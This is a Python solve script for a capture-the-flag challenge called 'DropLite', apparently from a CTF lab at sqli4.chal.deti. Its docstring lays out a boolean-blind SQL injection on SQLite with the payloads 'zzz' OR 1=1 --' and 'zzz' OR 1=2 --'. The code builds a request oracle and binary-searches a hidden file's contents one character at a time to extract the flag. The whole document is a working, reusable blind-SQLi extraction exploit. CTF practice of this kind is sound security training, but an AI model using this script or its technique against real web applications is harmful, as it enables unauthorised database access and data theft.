#!/usr/bin/env python3
"""
DropLite (sqli, 300, hard) — CWE-89 blind/boolean SQLi on SQLite.

/search?q=... injects into `... WHERE name LIKE '%<q>%'`. The response carries no
data, only a match count that flips with an injected boolean:
    zzz' OR 1=1 --  -> 6 files   (TRUE)
    zzz' OR 1=2 --  -> 0 files   (FALSE)
So we binary-search the content of quarterly-keys.txt one character at a time via
  (SELECT unicode(substr(content,i,1)) FROM files WHERE name='quarterly-keys.txt')

Usage:
    python3 solve.py                          # defaults to sqli4.chal.deti:8033
    python3 solve.py http://sqli4.chal.deti:8033
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://sqli4.chal.deti:8033"
TARGET = "quarterly-keys.txt"
COUNT_RE = re.compile(r'muted">\s*(\d+)\s+file')

session = requests.Session()
requests_made = 0


def oracle(cond: str) -> bool:
    """True if injecting `zzz' OR (cond) --` makes the match count > 0."""
    global requests_made
    q = f"zzz' OR ({cond}) -- "
    r = session.get(f"{BASE}/search", params={"q": q}, timeout=10)
    requests_made += 1
    m = COUNT_RE.search(r.text)
    return bool(m) and int(m.group(1)) > 0


def bsearch(expr: str, lo: int, hi: int) -> int:
    """Smallest v with expr <= v, found via `expr > mid` oracle."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main() -> int:
    content = f"(SELECT content FROM files WHERE name='{TARGET}')"
    length = bsearch(f"length({content})", 0, 256)
    print(f"[i] content length: {length}")

    out = []
    for i in range(1, length + 1):
        code = bsearch(f"unicode(substr({content},{i},1))", 0, 127)
        out.append(chr(code))
        sys.stdout.write(out[-1]); sys.stdout.flush()
    print()

    data = "".join(out)
    print(f"[i] requests made: {requests_made}")
    m = re.search(r"flag\{[^}]*\}", data)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] content:\n{data}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
